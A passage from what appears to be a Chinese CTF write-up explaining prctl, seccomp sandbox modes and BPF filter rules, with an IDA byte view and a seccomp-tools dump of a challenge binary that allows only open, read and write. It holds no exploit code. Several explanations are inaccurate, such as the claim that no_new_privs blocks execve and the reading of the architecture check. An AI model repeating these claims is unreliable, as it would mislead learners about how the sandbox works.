thread<span class="hljs-number">'</span>s no_new_privs attribute to the<br>value in arg2.  With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>)<br>promises not to grant privileges to <span class="hljs-keyword">do</span> anything that could<br>not have been done without the <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title function_">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span></span><br><span class="hljs-params">example, rendering the <span class="hljs-built_in">set</span>-user-ID and <span class="hljs-built_in">set</span>-group-ID mode</span><br><span class="hljs-params">bits, and file capabilities non-functional)</span>.  Once <span class="hljs-built_in">set</span>,<br>the no_new_privs attribute cannot be unset.  The setting<br>of this attribute is inherited by children created by<br><span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> and <span class="hljs-title function_">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, and preserved across <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.<br></code></pre></td></tr></tbody></table></figure><p>简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//设为1</span><br></code></pre></td></tr></tbody></table></figure><blockquote><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p></blockquote><p>在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。</p><p class='item-img' data-src='https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png'><img src="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png" alt="Snipaste_2023-09-14_23-07-36.png"></p><p>接着看第二个options PR_SET_SECCOMP：</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, </p><p>to limit the available system calls.</p></blockquote><p>一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。<br>常常与它在prctl出现的还有如下两个参数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SECCOMP_MODE_STRICT：<br>    the only system calls that the thread is permitted to make are <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,<br><span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,_<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(but not exit_group(<span class="hljs-number">2</span>))</span>, and <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>. <br><br><span class="hljs-title function_">SECCOMP_MODE_FILTER</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    the system calls allowed are defined by a pointer to a Berkeley Packet <br>    Filter passed in arg3.  This argument is a pointer to <span class="hljs-keyword">struct</span> sock_fprog; <br>it can be designed to filter arbitrary system calls and system call arguments.<br>  <br><span class="hljs-number">1</span>、SECCOMP_MODE*<span class="hljs-title function_">STRICT</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span>：<br>允许线程进行的唯一系统调用是read（2），write（2），*<span class="hljs-built_in">exit</span>（2）（但不是exit_group（2））<br>    和sigreturn（2）。<br><br>2、<span class="hljs-title function_">SECCOMP_MODE_FILTER</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 <br>    这个参数是一个指向<span class="hljs-keyword">struct</span> sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数<br></code></pre></td></tr></tbody></table></figure><p>上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。<br>将这几个参数带入到prctl：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br><span class="hljs-comment">//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则</span><br><span class="hljs-comment">//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，</span><br></code></pre></td></tr></tbody></table></figure><p>其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br><span class="hljs-comment">//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则</span><br><span class="hljs-comment">//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）</span><br></code></pre></td></tr></tbody></table></figure><p>上面v1所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v1所定义的规则：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048640</span> <span class="hljs-number">20</span>                            unk_8048640 db  <span class="hljs-number">20</span>h                     ; DATA XREF: orw_seccomp+<span class="hljs-number">17</span>↑o<br>.rodata:<span class="hljs-number">08048641</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048642</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048643</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048644</span> <span class="hljs-number">04</span>                            db    <span class="hljs-number">4</span><br>.rodata:<span class="hljs-number">08048645</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048646</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048647</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048648</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048649</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>A <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864B</span> <span class="hljs-number">09</span>                            db    <span class="hljs-number">9</span><br>.rodata:<span class="hljs-number">0804864</span>C <span class="hljs-number">03</span>                            db    <span class="hljs-number">3</span><br>.rodata:<span class="hljs-number">0804864</span>D <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>E <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864F</span> <span class="hljs-number">40</span>                            db  <span class="hljs-number">40</span>h ; @<br>.rodata:<span class="hljs-number">08048650</span> <span class="hljs-number">20</span>                            db  <span class="hljs-number">20</span>h<br>.rodata:<span class="hljs-number">08048651</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048652</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048653</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048654</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048655</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048656</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048657</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048658</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048659</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>A <span class="hljs-number">07</span>                            db    <span class="hljs-number">7</span><br>.rodata:<span class="hljs-number">0804865B</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>C AD                            db <span class="hljs-number">0</span>ADh<br></code></pre></td></tr></tbody></table></figure><p>好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><blockquote><p>从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。<br>对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？</p></blockquote><h2 id="BPF-规则介绍"><a href="#BPF-规则介绍" class="headerlink" title="BPF 规则介绍"></a><strong>BPF 规则介绍</strong></h2><p>Q：BPF是数据链路层上的一种接口，它怎么会出现在系统调用中？</p><p>A：其实这原本是TCP协议包的过滤规则格式，后面被引用为沙箱规则。</p><hr><p>简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>&amp;prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> {</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>      len;    <span class="hljs-comment">/* Number of BPF instructions */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <span class="hljs-comment">/* Pointer to array of BPF instructions */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>而filter域就指向了具体的规则，每一条规则有如下形式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> {</span>            <span class="hljs-comment">/* Filter block */</span><br>    __u16 code;                 <span class="hljs-comment">/* Actual filter code */</span><br>    __u8  jt;                   <span class="hljs-comment">/* Jump true */</span><br>    __u8  jf;                   <span class="hljs-comment">/* Jump false */</span><br>    __u32 k;                    <span class="hljs-comment">/* Generic multiuse field */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></tbody></table></figure><p>样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//首先指定操作的类别</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LD0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LDX0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ST0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_STX0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ALU0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JMP0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RET0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MISC    0x07</span><br><br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//在ld时指定操作数的大小</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_W0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_H0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_B0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//操作数类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IMM0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ABS0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IND0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MEM0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LEN0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MSH0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//当操作码类型为ALU时，指定具体运算符</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ADD0x00                    <span class="hljs-comment">//到底执行什么操作可以看filter.h里面的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_SUB0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MUL0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_DIV0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_OR0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_AND0x50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LSH0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RSH0x70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_NEG0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MOD0x90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_XOR0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JA0x00                    <span class="hljs-comment">//当操作码类型是JMP时指定跳转类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JEQ0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGT0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGE0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_K0x00                    <span class="hljs-comment">//常数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_X0x08</span><br></code></pre></td></tr></tbody></table></figure><p>另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> {</span><br>    <span class="hljs-type">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (在 &lt;linux/audit.h&gt; 里) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据</span><br><span class="hljs-comment">//或者</span><br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></td></tr></tbody></table></figure><p>而跳转语句写法如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)               <br><span class="hljs-comment">//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转</span><br></code></pre></td></tr></tbody></table></figure><p>其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。<br>最后当验证完成需要返回结果，即是否允许：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></td></tr></tbody></table></figure><p>过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。<br>总结一下：</p><ol><li><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP</li><li><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</li><li>BPF 条件判断跳转指令：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。</li><li><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</li></ol><p>例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> {<br>    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),          <span class="hljs-comment">// 从第0个字节位置开始，加载读取系统调用号</span><br>    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="hljs-number">257</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),       <span class="hljs-comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span><br>    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),         <span class="hljs-comment">// 比较系统调用号是否大于 0，是就跳到第6行</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="hljs-comment">// 拒绝系统调用，返回 0</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="hljs-comment">// 允许系统调用</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>拿本题的sock_filter结构体说明一下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br></code></pre></td></tr></tbody></table></figure><p>line 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。<br>line 